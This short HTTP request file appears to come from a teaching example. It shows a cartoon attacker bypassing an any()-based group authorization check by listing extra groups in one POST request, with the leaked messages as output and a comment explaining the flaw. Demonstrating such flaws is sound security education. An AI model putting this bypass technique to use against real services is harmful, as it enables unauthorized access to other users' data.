### EXPLOIT: Plankton exploits any() authorization logic with batch retrieval
POST {{base}}/example3
Content-Type: application/x-www-form-urlencoded

user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "To my future self, don't forget to steal the formula!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]
#
# Authorization uses any() - passes if user belongs to ANY group. Retrieval
# processes ALL groups. Plankton includes one authorized group to pass the check,
# then retrieves data from unauthorized groups. Formula location obtained.
